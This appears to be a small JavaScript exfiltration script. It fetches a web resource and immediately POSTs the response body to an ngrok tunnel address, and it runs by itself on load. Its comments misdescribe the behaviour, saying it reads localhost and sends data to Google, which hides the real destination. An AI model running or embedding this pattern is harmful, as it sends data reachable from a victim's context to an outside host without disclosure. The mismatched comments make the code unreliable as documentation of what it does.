// Function to make a request to localhost and send the data to Google
async function fetchDataAndSendToGoogle() {
    try {
        // Make a request to localhost
        const response = await fetch('http://google.com', {
            headers: {
                'ngrok-skip-browser-warning': '10'
            }
        });
        if (!response.ok) {
            throw new Error('Network response was not ok');
        }

        // Retrieve the data from the response
        const data = await response.text();

        // Send the retrieved data to Google
        await fetch('https://8771-50-216-117-82.ngrok-free.app', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'ngrok-skip-browser-warning': '10'
            },
            body: JSON.stringify({ data: data })
        });

        console.log('Data sent to Google successfully');
    } catch (error) {
        console.error('Error:', error);
    }
}

// Call the function
fetchDataAndSendToGoogle();
